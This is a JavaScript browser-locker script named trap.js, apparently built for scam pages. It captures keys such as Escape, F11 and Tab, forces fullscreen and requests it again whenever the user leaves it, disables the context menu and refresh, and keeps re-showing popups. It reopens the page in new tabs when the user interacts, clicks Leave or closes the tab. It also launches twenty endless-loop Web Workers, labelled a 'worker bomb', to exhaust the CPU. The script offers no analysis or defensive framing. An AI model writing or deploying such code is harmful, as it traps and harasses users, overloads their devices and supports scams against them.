/* trap.js — HARD LOCK: keyboard capture + fullscreen re-request + reopen on close */
(function () {
  'use strict';

  var POPUP_COOLDOWN = 1000;
  var OVERLAY_FLASH  = 3000;
  var FS_RETRY_DELAY = 250;
  var lastArm = 0;
  var armed = false;
  var workers = [];
  var workerURL = null;
  var leaving = false;
  var fsTimer = null;
  var nativeLeaveBlocked = false;

  function $(id) { return document.getElementById(id); }

  /* ---------- KEYBOARD LOCK ---------- */
  function lockKeyboard() {
    try {
      if (navigator.keyboard && navigator.keyboard.lock) {
        navigator.keyboard.lock(['Escape', 'F11', 'F5', 'KeyW', 'Tab', 'KeyC', 'KeyD']);
      }
    } catch (e) {}
  }

  /* ---------- FULLSCREEN ---------- */
  function isFullscreen() {
    return !!(document.fullscreenElement || document.webkitFullscreenElement ||
              document.mozFullScreenElement || document.msFullscreenElement);
  }
  function requestFS() {
    var el = document.documentElement;
    var fn = el.requestFullscreen || el.webkitRequestFullscreen ||
             el.mozRequestFullScreen || el.msRequestFullscreen;
    if (fn && !isFullscreen()) {
      try {
        var p = fn.call(el);
        if (p && p.catch) p.catch(function () {});
      } catch (e) {}
    }
  }
  function reRequestFS() {
    clearTimeout(fsTimer);
    fsTimer = setTimeout(function () {
      if (!isFullscreen()) requestFS();
    }, FS_RETRY_DELAY);
  }

  ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange']
    .forEach(function (ev) {
      document.addEventListener(ev, function () {
        if (!isFullscreen()) {
          flashOverlay();
          reRequestFS();
        }
      }, false);
    });

  function flashOverlay() {
    var ov = $('overlay2');
    if (!ov) return;
    ov.style.display = 'block';
    setTimeout(function () { ov.style.display = 'none'; }, OVERLAY_FLASH);
  }

  /* ---------- POPUP RE-ARM ---------- */
  function armPopup(force) {
    var now = Date.now();
    if (!force && now - lastArm < POPUP_COOLDOWN) return;
    lastArm = now;
    var pop = $('pop_up_new');
    if (pop) {
      pop.style.display = 'block';
      pop.style.animation = 'none';
      void pop.offsetWidth;
      pop.style.animation = '4s infinite zoominoutsinglefeatured';
    }
    if (!isFullscreen()) reRequestFS();
  }

  ['mousemove','scroll','wheel','keydown','touchmove','touchstart','click']
    .forEach(function (ev) {
      window.addEventListener(ev, function () { armPopup(false); }, { passive: true });
    });

  window.addEventListener('focus', function () { armPopup(true); });
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) armPopup(true);
  });

  /* ---------- KEY BLOCKING ---------- */
  document.addEventListener('keydown', function (e) {
    var k = e.keyCode || e.which;
    if (k === 27) {
      e.preventDefault(); e.returnValue = false;
      reRequestFS();
      return false;
    }
    if (k === 122) {
      e.preventDefault(); e.returnValue = false;
      reRequestFS();
      return false;
    }
    if (k === 116) { e.preventDefault(); e.returnValue = false; }
    if (k === 8) {
      var t = e.target;
      if (!t || (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA')) e.preventDefault();
    }
    if ((e.ctrlKey || e.metaKey) && k === 87) armPopup(true);
  }, false);

  document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }, false);
  document.oncontextmenu = function () { return false; };

  /* ---------- FIRST INTERACTION ---------- */
  function firstInteract() {
    if (armed) return;
    armed = true;
    requestFS();
    armPopup(true);
    tryLockKeyboard();
    try { window.open(window.location.href, '_blank'); } catch (e) {}
  }
  ['click','keydown','touchstart','mousemove'].forEach(function (ev) {
    window.addEventListener(ev, firstInteract, { passive: true });
  });

  /* ---------- UI WIRING ---------- */
  function wireUI() {
    setTimeout(function () {
      var m = $('modalbx');
      if (m) m.style.display = 'block';
    }, 300);

    document.body.addEventListener('click', function () {
      var m = $('modalbx');
      if (m) m.style.display = 'none';
    });

    var box    = $('exit-popup');
    var leave  = document.querySelector('#exit_leave');
    var cancel = document.querySelector('#exit_cancel');

    // --- THE FIX: Prevent native dialog on Leave button click ---
    if (leave) {
      leave.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        nativeLeaveBlocked = true;
        box.style.display = 'none';
        // Open new tab BEFORE closing
        try { window.open(window.location.href, '_blank'); } catch (e) {}
        // Close current tab
        window.close();
      });
    }

    if (cancel) cancel.addEventListener('click', function () {
      box.style.display = 'none';
      armPopup(true);
    });

    var ok = $('leave_page_ok'), cn = $('leave_page_cancel');
    if (ok) ok.addEventListener('click', function () { $('pop_up_new').style.display = 'none'; });
    if (cn) cn.addEventListener('click', function () { $('pop_up_new').style.display = 'none'; });

    setTimeout(function () { armPopup(true); }, 800);
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', wireUI);
  } else { wireUI(); }

  /* ---------- WORKER BOMB ---------- */
  function startWorkers(count) {
    if (!workerURL) {
      var script = 'let c=0;while(true){c++;Math.random()*Math.random();' +
                   'if(c%1e6===0){postMessage({status:"working",counter:c});}}';
      workerURL = URL.createObjectURL(new Blob([script], { type: 'application/javascript' }));
    }
    for (var i = 0; i < count; i++) {
      try { workers.push(new Worker(workerURL)); } catch (e) {}
    }
  }
  startWorkers(20);

  /* ---------- HARD CLOSE TRAP ---------- */
  // Only show native dialog if NOT blocked by Leave button
  window.addEventListener('beforeunload', function (e) {
    if (nativeLeaveBlocked) return;
    var msg = 'Are you sure you want to leave this page?';
    if (e) { e.returnValue = msg; }
    return msg;
  }, false);

  // Reopen on actual close (if user uses Alt+F4 or browser X)
  window.addEventListener('unload', function () {
    if (!nativeLeaveBlocked) {
      try { window.open(window.location.href, '_blank'); } catch (e) {}
    }
  }, false);

})();
